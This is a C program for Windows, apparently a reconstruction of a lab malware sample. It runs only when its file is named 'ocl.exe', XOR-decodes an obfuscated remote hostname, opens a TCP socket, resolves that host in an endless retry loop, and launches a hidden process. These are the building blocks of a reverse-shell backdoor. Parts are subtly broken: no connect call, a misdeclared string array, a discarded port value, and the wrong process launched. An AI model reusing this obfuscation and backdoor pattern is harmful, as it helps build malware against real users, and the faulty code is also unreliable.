#include<stdio.h>
#include <string.h>
#include<Winsock2.h>
#pragma comment(lib,"ws2_32.lib")
int main(){
	//key in hex :31 71 61 7a 32 77 73 78 33 65 64 63 20
	//decode string in hex :46 06 16 54 42 05 12 1b 47 0c 07 02 5d 1c 00 16 45 16 01 1d 52 0b 05 0f 48 02 08 09 1c 15
	//both xored: 77 77 77 2e 70 72 61 63 74 69 63 61 6c 6d 61 6c 77 61 72 65 61 6e 61 6c 79 73 69 73 2e 63 6f 6d 
	// 1qaz2wsx3edc
	char a[13] = { '1','q','a','z','2','w','s','x','3','e','d','c','\0' };
	char *b[] = { 'o', 'c', 'l', '.', 'e', 'x', 'e', '\0' };
	//decode string in hex :46 06 16 54 42 05 12 1b 47 0c 07 02 5d 1c 00 16 45 16 01 1d 52 0b 05 0f 48 02 08 09 1c 15

	char encode[32] = {'\x46','\x06', '\x16', '\x54', '\x42', '\x05', '\x12', '\x1b', '\x47', '\x0c', '\x07', '\x02', '\x5d', '\x1c' ,'\x00', '\x16', '\x45' ,'\x16', '\x01', '\x1d', '\x52', '\x0b', '\x05', '\x0f', '\x48', '\x02', '\x08', '\x09', '\x1c', '\x14','\x1c','\x15' };
	char xor[33];
	for (int i = 0; i < 32; i++)
	{
		xor[i] = '\0';
	}
	char string1[13] ;
	char string2[8] ;
	
	for (int i = 0; i <13; i++)
	{
		string1[i] = a[i];
	}
	//printf("%s\n",string1);
	for (int i = 0; i <8; i++)
	{
		string2[i] = b[i];
	}
	//printf("%s\n", string2);
	char binaryPathName[270];
	GetModuleFileNameA(0, binaryPathName, 0x10E);
	//printf("%s\n", binaryPathName);
	
	const char ch = '\\';
	char *ret;
	ret = strrchr(&binaryPathName, 0x5C);
	//printf("%s\n", ret);
	int size = strlen(ret);
	char newret[8];
	for (int i = 0; i < 8; i++)
	{
		//printf("%c", ret[i+1]);
		newret[i] = ret[i + 1];

	}
	int r;
	r = strcmp(newret, &string2);
	
	if (r ==0)
	{
		//printf("the string are equal\n");
		WORD wVersionRequested;
		WSADATA WSAData;
		int err;
		while (1)
		{


			err = WSAStartup(MAKEWORD(2, 2), &WSAData);
			if (err == 0)
			{
				// make the socket
				SOCKET s;
				s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
				//s = WSASocketA(2,1,6,0,0,0);
				// do the xor
				if (s != INVALID_SOCKET)
				{
					for (int i = 0; i < 32; ++i){

						xor[i] = (encode[i] ^ a[i % 12]);
					}
					xor[32] = '\0';
					//printf("%s\n", xor);
					//gethostbyname
					struct hostent *remoteHost;
					remoteHost = gethostbyname(xor);
					if (remoteHost == NULL)
					{
						//printf("host is invalid\n");
						closesocket(s);
						WSACleanup();
						Sleep(3000);
						continue;

					}
					else{
						ntohs(0x270f);

						//STARTUPINFO

						STARTUPINFO StartupInfo;
						PROCESS_INFORMATION ProcessInfo;
						
						char *pEnvCMD = NULL;
						char *pDefaultCMD = "cmd.exe";
						ULONG rc;

						memset(&StartupInfo, 0, sizeof(StartupInfo));
						StartupInfo.cb = sizeof(STARTUPINFO);
						StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
						StartupInfo.wShowWindow = SW_HIDE;
						CreateProcessA(NULL,"ocl.exe" , NULL, NULL, FALSE,
							CREATE_NEW_CONSOLE,
							NULL,
							NULL,
							&StartupInfo,
							&ProcessInfo);
						
						Sleep(3000);
						continue;
					}

				}
				else
				{
					closesocket(s);
					WSACleanup();
					Sleep(3000);
					continue;
				}

			}
		}
	}
	else
	{
		system("exit");
	}
	
	
}